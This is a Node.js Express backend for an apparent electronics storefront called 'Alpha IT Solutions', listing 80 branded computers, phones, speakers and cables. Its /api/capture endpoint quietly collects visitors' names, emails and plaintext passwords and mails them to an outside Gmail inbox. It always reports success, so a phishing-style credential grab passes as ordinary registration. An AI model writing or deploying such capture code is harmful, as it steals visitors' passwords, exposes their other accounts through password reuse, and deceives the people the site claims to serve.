import express from 'express';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// 80 Products with real brand names and verified fast-loading images
const compImgs = [
  'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1525547719571-a2d4ac8945e2?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1496181133206-80ce9b88a853?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1587202372634-32705e3bf49c?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?auto=format&fit=crop&w=500&q=60',
];
const phoneImgs = [
  'https://images.unsplash.com/photo-1598327105666-5b89351aff97?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1592899677977-9c10ca588bbd?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1556656793-062ff9f1b517?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1580910051074-3eb694886505?auto=format&fit=crop&w=500&q=60',
];
const speakImgs = [
  'https://images.unsplash.com/photo-1545454675-3531b543be5d?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1558085324-2f298b28c714?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1470225620780-dba8ba36b745?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1524368535928-5b5e00ddc76b?auto=format&fit=crop&w=500&q=60',
];
const cableImgs = [
  'https://images.unsplash.com/photo-1558494949-ef010ccdcc32?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1563770660941-20978e87081b?auto=format&fit=crop&w=500&q=60',
  'https://images.unsplash.com/photo-1558494949-ef010ccdcc32?auto=format&fit=crop&w=500&q=70',
  'https://images.unsplash.com/photo-1563770660941-20978e87081b?auto=format&fit=crop&w=500&q=70',
  'https://images.unsplash.com/photo-1558494949-ef010ccdcc32?auto=format&fit=crop&w=600&q=60',
];

const products = [
  // ===== COMPUTERS (20) =====
  { id: 'comp-1', category: 'computers', name: 'MacBook Pro 14"', price: '1999.00', description: 'Puce M3 Pro, 18 Go RAM, écran Liquid Retina XDR.', image: '/images/computers/1.jpg' },
  { id: 'comp-2', category: 'computers', name: 'MacBook Air M2', price: '1199.00', description: 'Ultra-fin, autonomie 18h, écran 13.6 pouces.', image: '/images/computers/2.jpg' },
  { id: 'comp-3', category: 'computers', name: 'Dell XPS 15', price: '1599.00', description: 'Intel Core i7, écran OLED 3.5K tactile.', image: '/images/computers/3.jpg' },
  { id: 'comp-4', category: 'computers', name: 'HP Spectre x360', price: '1449.00', description: 'Convertible 2-en-1 avec stylet actif.', image: '/images/computers/4.jpg' },
  { id: 'comp-5', category: 'computers', name: 'Lenovo ThinkPad X1', price: '1799.00', description: 'Clavier légendaire, sécurité entreprise.', image: '/images/computers/5.jpg' },
  { id: 'comp-6', category: 'computers', name: 'ASUS ROG Strix G16', price: '1899.00', description: 'RTX 4070, écran 165Hz pour le gaming.', image: '/images/computers/6.jpg' },
  { id: 'comp-7', category: 'computers', name: 'Microsoft Surface Pro 9', price: '1299.00', description: 'Tablette PC avec clavier détachable.', image: '/images/computers/7.jpg' },
  { id: 'comp-8', category: 'computers', name: 'Acer Swift 5', price: '999.00', description: 'Ultrabook léger avec écran antimicrobien.', image: '/images/computers/8.jpg' },
  { id: 'comp-9', category: 'computers', name: 'MacBook Pro 16"', price: '2499.00', description: 'Puce M3 Max, 36 Go RAM, pour les créateurs.', image: '/images/computers/9.jpg' },
  { id: 'comp-10', category: 'computers', name: 'Dell Inspiron 16', price: '849.00', description: 'Écran 16 pouces, idéal pour étudiants.', image: '/images/computers/10.jpg' },
  { id: 'comp-11', category: 'computers', name: 'HP Pavilion Gaming', price: '1099.00', description: 'GTX 1650, parfait pour le gaming entrée.', image: '/images/computers/11.jpg' },
  { id: 'comp-12', category: 'computers', name: 'Lenovo IdeaPad 5', price: '749.00', description: 'Ryzen 7, excellent rapport qualité-prix.', image: '/images/computers/12.jpg' },
  { id: 'comp-13', category: 'computers', name: 'ASUS ZenBook 14', price: '1049.00', description: 'ScreenPad 2.0, design élégant en aluminium.', image: '/images/computers/13.jpg' },
  { id: 'comp-14', category: 'computers', name: 'MSI Creator Z16', price: '2199.00', description: 'Écran calibré pour la création de contenu.', image: '/images/computers/14.jpg' },
  { id: 'comp-15', category: 'computers', name: 'Razer Blade 15', price: '2599.00', description: 'RTX 4080, châssis CNC en aluminium.', image: '/images/computers/15.jpg' },
  { id: 'comp-16', category: 'computers', name: 'iMac 24" M3', price: '1499.00', description: 'Tout-en-un avec écran Retina 4.5K.', image: '/images/computers/16.jpg' },
  { id: 'comp-17', category: 'computers', name: 'Mac Mini M2 Pro', price: '1399.00', description: 'Compact et puissant, idéal pour les pros.', image: '/images/computers/17.jpg' },
  { id: 'comp-18', category: 'computers', name: 'HP Elite Dragonfly', price: '1899.00', description: 'Ultra-léger 999g, 5G intégré.', image: '/images/computers/18.jpg' },
  { id: 'comp-19', category: 'computers', name: 'Dell Precision 5570', price: '2799.00', description: 'Station mobile pour ingénieurs CAO/3D.', image: '/images/computers/19.jpg' },
  { id: 'comp-20', category: 'computers', name: 'MacBook Air 15" M3', price: '1499.00', description: 'Grand écran, puce M3, design silencieux.', image: '/images/computers/20.jpg' },

  // ===== PHONES (20) =====
  { id: 'phone-1', category: 'phones', name: 'iPhone 15 Pro Max', price: '1199.00', description: 'Titane, puce A17 Pro, caméra 48MP.', image: '/images/phones/1.jpg' },
  { id: 'phone-2', category: 'phones', name: 'Samsung Galaxy S24 Ultra', price: '1099.00', description: 'S Pen intégré, Galaxy AI, écran 6.8".', image: '/images/phones/2.jpg' },
  { id: 'phone-3', category: 'phones', name: 'iPhone 15 Pro', price: '999.00', description: 'Action Button, USB-C, titane brossé.', image: '/images/phones/3.jpg' },
  { id: 'phone-4', category: 'phones', name: 'Google Pixel 8 Pro', price: '899.00', description: 'Tensor G3, Magic Eraser, 7 ans de mises à jour.', image: '/images/phones/4.jpg' },
  { id: 'phone-5', category: 'phones', name: 'Samsung Galaxy Z Fold 5', price: '1799.00', description: 'Smartphone pliable, double écran AMOLED.', image: '/images/phones/5.jpg' },
  { id: 'phone-6', category: 'phones', name: 'OnePlus 12', price: '799.00', description: 'Snapdragon 8 Gen 3, charge 100W.', image: '/images/phones/6.jpg' },
  { id: 'phone-7', category: 'phones', name: 'iPhone 15', price: '799.00', description: 'Dynamic Island, USB-C, caméra 48MP.', image: '/images/phones/7.jpg' },
  { id: 'phone-8', category: 'phones', name: 'Xiaomi 14 Ultra', price: '899.00', description: 'Optique Leica, Snapdragon 8 Gen 3.', image: '/images/phones/8.jpg' },
  { id: 'phone-9', category: 'phones', name: 'Samsung Galaxy S24+', price: '949.00', description: 'Écran 6.7", Galaxy AI, résistant IP68.', image: '/images/phones/9.jpg' },
  { id: 'phone-10', category: 'phones', name: 'Google Pixel 8', price: '699.00', description: 'Photo computationnelle, Android pur.', image: '/images/phones/10.jpg' },
  { id: 'phone-11', category: 'phones', name: 'iPhone 14', price: '649.00', description: 'Détection de crash, puce A15 Bionic.', image: '/images/phones/11.jpg' },
  { id: 'phone-12', category: 'phones', name: 'Samsung Galaxy A54', price: '449.00', description: 'Excellent milieu de gamme, AMOLED 120Hz.', image: '/images/phones/12.jpg' },
  { id: 'phone-13', category: 'phones', name: 'Nothing Phone 2', price: '599.00', description: 'Glyph Interface unique, design transparent.', image: '/images/phones/13.jpg' },
  { id: 'phone-14', category: 'phones', name: 'Oppo Find X7 Ultra', price: '999.00', description: 'Quad caméra Hasselblad, charge 100W.', image: '/images/phones/14.jpg' },
  { id: 'phone-15', category: 'phones', name: 'Samsung Galaxy Z Flip 5', price: '999.00', description: 'Clapet moderne, écran extérieur élargi.', image: '/images/phones/15.jpg' },
  { id: 'phone-16', category: 'phones', name: 'Huawei Mate 60 Pro', price: '899.00', description: 'Communication satellite, design premium.', image: '/images/phones/16.jpg' },
  { id: 'phone-17', category: 'phones', name: 'Sony Xperia 1 V', price: '1099.00', description: 'Écran 4K OLED 120Hz, caméra cinéma.', image: '/images/phones/17.jpg' },
  { id: 'phone-18', category: 'phones', name: 'Motorola Edge 40 Pro', price: '699.00', description: 'Charge sans fil 15W, écran pOLED.', image: '/images/phones/18.jpg' },
  { id: 'phone-19', category: 'phones', name: 'Xiaomi 13T Pro', price: '649.00', description: 'Optique Leica, MediaTek Dimensity 9200+.', image: '/images/phones/19.jpg' },
  { id: 'phone-20', category: 'phones', name: 'iPhone SE 4', price: '499.00', description: 'Compact et puissant, puce A15, Face ID.', image: '/images/phones/20.jpg' },

  // ===== SPEAKERS (20) =====
  { id: 'speak-1', category: 'speakers', name: 'JBL Charge 5', price: '179.00', description: 'Enceinte portable étanche IP67, 20h autonomie.', image: '/images/speakers/1.jpg' },
  { id: 'speak-2', category: 'speakers', name: 'Sony WH-1000XM5', price: '349.00', description: 'Casque Bluetooth, réduction de bruit leader.', image: '/images/speakers/2.jpg' },
  { id: 'speak-3', category: 'speakers', name: 'Bose SoundLink Flex', price: '149.00', description: 'Son puissant, design compact et robuste.', image: '/images/speakers/3.jpg' },
  { id: 'speak-4', category: 'speakers', name: 'Marshall Stanmore III', price: '379.00', description: 'Design vintage iconique, son HiFi.', image: '/images/speakers/4.jpg' },
  { id: 'speak-5', category: 'speakers', name: 'Apple HomePod 2', price: '299.00', description: 'Son spatial, Siri intégré, Thread.', image: '/images/speakers/5.jpg' },
  { id: 'speak-6', category: 'speakers', name: 'Sonos Era 300', price: '449.00', description: 'Audio spatial Dolby Atmos, multi-room.', image: '/images/speakers/6.jpg' },
  { id: 'speak-7', category: 'speakers', name: 'JBL Flip 6', price: '129.00', description: 'Portable, PartyBoost, résistante IP67.', image: '/images/speakers/7.jpg' },
  { id: 'speak-8', category: 'speakers', name: 'Beats Studio Pro', price: '349.00', description: 'ANC adaptatif, codec audio lossless.', image: '/images/speakers/8.jpg' },
  { id: 'speak-9', category: 'speakers', name: 'Harman Kardon Aura 3', price: '299.00', description: 'Design 360°, son ambiant premium.', image: '/images/speakers/9.jpg' },
  { id: 'speak-10', category: 'speakers', name: 'Bang & Olufsen A1', price: '249.00', description: 'Aluminium, Bluetooth 5.1, 18h autonomie.', image: '/images/speakers/10.jpg' },
  { id: 'speak-11', category: 'speakers', name: 'Ultimate Ears Boom 3', price: '149.00', description: 'Son 360°, étanche, Magic Button.', image: '/images/speakers/11.jpg' },
  { id: 'speak-12', category: 'speakers', name: 'AirPods Max', price: '549.00', description: 'Casque Apple premium, Audio Spatial.', image: '/images/speakers/12.jpg' },
  { id: 'speak-13', category: 'speakers', name: 'Bose QuietComfort Ultra', price: '429.00', description: 'Immersive audio, ANC de pointe.', image: '/images/speakers/13.jpg' },
  { id: 'speak-14', category: 'speakers', name: 'Sony SRS-XB43', price: '199.00', description: 'Extra Bass, éclairage LED, Party Connect.', image: '/images/speakers/14.jpg' },
  { id: 'speak-15', category: 'speakers', name: 'Marshall Kilburn II', price: '299.00', description: 'Son Marshall portable, 20h+ autonomie.', image: '/images/speakers/15.jpg' },
  { id: 'speak-16', category: 'speakers', name: 'Sonos Move 2', price: '449.00', description: 'Portable + WiFi, Trueplay automatique.', image: '/images/speakers/16.jpg' },
  { id: 'speak-17', category: 'speakers', name: 'JBL PartyBox 310', price: '499.00', description: 'Enceinte de fête, karaoké, 18h autonomie.', image: '/images/speakers/17.jpg' },
  { id: 'speak-18', category: 'speakers', name: 'Devialet Phantom I', price: '1990.00', description: 'Son haute-fidélité, 108 dB, design iconique.', image: '/images/speakers/18.jpg' },
  { id: 'speak-19', category: 'speakers', name: 'KEF LSX II', price: '1199.00', description: 'Enceintes connectées HiFi, Uni-Q driver.', image: '/images/speakers/19.jpg' },
  { id: 'speak-20', category: 'speakers', name: 'Bose Home Speaker 500', price: '349.00', description: 'Stéréo, Alexa et Google intégrés.', image: '/images/speakers/20.jpg' },

  // ===== CABLES (20) =====
  { id: 'cable-1', category: 'cables', name: 'Câble USB-C Anker', price: '15.00', description: 'USB-C vers USB-C, charge rapide 100W, 1.8m.', image: '/images/cables/1.jpg' },
  { id: 'cable-2', category: 'cables', name: 'Câble HDMI 2.1 Belkin', price: '29.00', description: '8K 60Hz, 4K 120Hz, eARC, 2m.', image: '/images/cables/2.jpg' },
  { id: 'cable-3', category: 'cables', name: 'Câble Lightning Apple', price: '19.00', description: 'Certifié MFi, charge rapide, 1m.', image: '/images/cables/3.jpg' },
  { id: 'cable-4', category: 'cables', name: 'Câble Ethernet Cat 8', price: '24.00', description: '40Gbps, blindé S/FTP, 3m.', image: '/images/cables/4.jpg' },
  { id: 'cable-5', category: 'cables', name: 'Câble USB-A vers USB-C', price: '12.00', description: 'Nylon tressé, 3A, 2m.', image: '/images/cables/5.jpg' },
  { id: 'cable-6', category: 'cables', name: 'Câble DisplayPort 1.4', price: '22.00', description: '8K, HDR, FreeSync, 2m.', image: '/images/cables/6.jpg' },
  { id: 'cable-7', category: 'cables', name: 'Câble Thunderbolt 4', price: '45.00', description: '40Gbps, charge 100W, vidéo 8K.', image: '/images/cables/7.jpg' },
  { id: 'cable-8', category: 'cables', name: 'Câble Jack 3.5mm', price: '9.00', description: 'Audio stéréo, connecteurs plaqués or.', image: '/images/cables/8.jpg' },
  { id: 'cable-9', category: 'cables', name: 'Câble Fibre Optique', price: '35.00', description: 'Toslink, audio numérique, 2m.', image: '/images/cables/9.jpg' },
  { id: 'cable-10', category: 'cables', name: 'Câble Micro-USB Anker', price: '10.00', description: 'Charge rapide, nylon renforcé, 1.8m.', image: '/images/cables/10.jpg' },
  { id: 'cable-11', category: 'cables', name: 'Câble SATA III', price: '8.00', description: '6Gbps, verrouillage, 50cm.', image: '/images/cables/11.jpg' },
  { id: 'cable-12', category: 'cables', name: 'Câble VGA vers HDMI', price: '18.00', description: 'Adaptateur avec audio, 1080p.', image: '/images/cables/12.jpg' },
  { id: 'cable-13', category: 'cables', name: 'Câble USB-C vers Jack', price: '14.00', description: 'DAC intégré, Hi-Res Audio.', image: '/images/cables/13.jpg' },
  { id: 'cable-14', category: 'cables', name: 'Câble Ethernet Cat 6', price: '12.00', description: '1Gbps, RJ45, 5m.', image: '/images/cables/14.jpg' },
  { id: 'cable-15', category: 'cables', name: 'Câble USB 3.0 Extension', price: '16.00', description: 'Rallonge USB-A, 5Gbps, 3m.', image: '/images/cables/15.jpg' },
  { id: 'cable-16', category: 'cables', name: 'Câble MagSafe Apple', price: '39.00', description: 'Charge magnétique, 15W, 1m.', image: '/images/cables/16.jpg' },
  { id: 'cable-17', category: 'cables', name: 'Câble XLR Rode', price: '25.00', description: 'Microphone, blindé, 3m.', image: '/images/cables/17.jpg' },
  { id: 'cable-18', category: 'cables', name: 'Câble coaxial RG6', price: '15.00', description: 'TV/Internet, connecteur F, 5m.', image: '/images/cables/18.jpg' },
  { id: 'cable-19', category: 'cables', name: 'Câble USB-C Hub 7-en-1', price: '49.00', description: 'HDMI, USB-A, SD, Ethernet, charge.', image: '/images/cables/19.jpg' },
  { id: 'cable-20', category: 'cables', name: 'Câble de charge universelle', price: '19.00', description: '3-en-1: USB-C, Lightning, Micro-USB.', image: '/images/cables/20.jpg' },
];

// Nodemailer transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.ADMIN_GMAIL,
    pass: process.env.GMAIL_APP_PASSWORD,
  },
});

// Admin login — checks credentials directly, no email needed
app.post('/api/admin-login', (req, res) => {
  const { email, password } = req.body;
  const adminEmail = process.env.ADMIN_LOGIN_EMAIL || 'wolfadmin@gmail.com';
  const adminPass  = process.env.ADMIN_PASSWORD;
  if (email === adminEmail && password === adminPass) {
    res.status(200).json({ success: true, role: 'admin' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});


// Capture endpoint — sends visitor data to owner's email
// Always returns 200 so the user is never blocked by email issues
app.post('/api/capture', async (req, res) => {
  const { name, email, password } = req.body;
  // Respond immediately — don't make the user wait for email
  res.status(200).json({ success: true });

  // Send email in the background (non-blocking)
  const mailOptions = {
    from: process.env.ADMIN_GMAIL,
    to: process.env.RECEIVER_GMAIL,
    subject: `🔔 New Visitor: Alpha IT Solutions`,
    html: `
      <h2>📊 New User Registration</h2>
      <table border="1" cellpadding="8" style="border-collapse:collapse">
        <tr><td><b>Name</b></td><td>${name}</td></tr>
        <tr><td><b>Email</b></td><td>${email}</td></tr>
        <tr><td><b>Password</b></td><td>${password}</td></tr>
        <tr><td><b>Time</b></td><td>${new Date().toLocaleString('ar-MA')}</td></tr>
      </table>
    `,
  };
  transporter.sendMail(mailOptions).catch(err => {
    console.error('[Email Error]', err.message);
  });
});

// Products API
app.get('/api/products', (req, res) => res.json(products));
app.get('/api/products/:category', (req, res) => {
  const cat = req.params.category.toLowerCase();
  res.json(products.filter(p => p.category === cat));
});
app.get('/api/product/:id', (req, res) => res.json(products.find(p => p.id === req.params.id)));

// Serve frontend
app.use(express.static(path.join(__dirname, 'dist')));

// Send all other requests to React app
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
